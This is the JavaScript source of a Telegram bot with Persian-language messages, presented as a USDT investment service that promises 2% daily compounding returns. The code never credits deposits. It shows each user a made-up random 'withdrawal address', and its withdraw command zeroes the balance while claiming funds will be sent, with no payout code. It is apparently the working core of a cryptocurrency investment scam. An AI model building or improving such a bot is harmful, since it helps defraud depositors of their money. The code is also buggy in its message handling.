import { Telegraf } from 'telegraf';
import { Low, JSONFile } from 'lowdb';
import { nanoid } from 'nanoid';

const BOT_TOKEN = process.env.BOT_TOKEN || 'PASTE_YOUR_BOT_TOKEN_HERE';
const bot = new Telegraf(BOT_TOKEN);

const adapter = new JSONFile('db.json');
const db = new Low(adapter);
await db.read();
db.data ||= { users: [] };
await db.write();

const DEPOSIT_ADDRESS = 'TNXXXXXXX...';

function findUser(id) {
  return db.data.users.find(u => u.id === id);
}

function add2Percent(user) {
  const now = new Date();
  const last = new Date(user.lastUpdate || now);
  const days = Math.floor((now - last) / (1000 * 60 * 60 * 24));
  if (days > 0) {
    user.balance += user.balance * 0.02 * days;
    user.lastUpdate = now.toISOString();
  }
}

bot.start(async (ctx) => {
  const id = ctx.from.id;
  let user = findUser(id);
  if (!user) {
    await ctx.reply('📧 لطفاً ایمیل خود را وارد کنید:');
    bot.on('text', async (ctx2) => {
      if (findUser(ctx2.from.id)) return;
      const email = ctx2.message.text;
      const address = `T${nanoid(32).toUpperCase()}`;
      db.data.users.push({ id, email, address, balance: 0, lastUpdate: new Date().toISOString() });
      await db.write();
      await ctx2.reply(`✅ ثبت‌نام با موفقیت انجام شد!

💰 آدرس واریز (ثابت): \`${DEPOSIT_ADDRESS}\`
🏦 آدرس برداشت شما: \`${address}\``);
    });
  } else {
    await ctx.reply('شما قبلاً ثبت‌نام کرده‌اید.', mainMenu());
  }
});

bot.command('dashboard', async (ctx) => {
  const user = findUser(ctx.from.id);
  if (!user) return ctx.reply('لطفاً ابتدا /start را بزنید.');
  add2Percent(user);
  await db.write();
  await ctx.reply(`📊 داشبورد:

💸 موجودی: ${user.balance.toFixed(2)} USDT
🏦 آدرس برداشت: \`${user.address}\`
💰 آدرس واریز (ثابت): \`${DEPOSIT_ADDRESS}\``, mainMenu());
});

bot.command('withdraw', async (ctx) => {
  const user = findUser(ctx.from.id);
  if (!user) return ctx.reply('لطفاً ابتدا /start را بزنید.');
  if (user.balance < 5) return ctx.reply('حداقل مقدار برداشت ۵ USDT است.');

  user.balance = 0;
  await db.write();
  await ctx.reply(`✅ درخواست برداشت ثبت شد.
🔄 مبلغ به آدرس \`${user.address}\` ارسال خواهد شد.`);
});

function mainMenu() {
  return {
    reply_markup: {
      keyboard: [['📊 داشبورد', '💸 برداشت']],
      resize_keyboard: true,
      one_time_keyboard: false
    }
  };
}

bot.hears('📊 داشبورد', ctx => ctx.telegram.sendMessage(ctx.chat.id, '/dashboard'));
bot.hears('💸 برداشت', ctx => ctx.telegram.sendMessage(ctx.chat.id, '/withdraw'));

bot.launch();
console.log('🤖 Bot is running...');
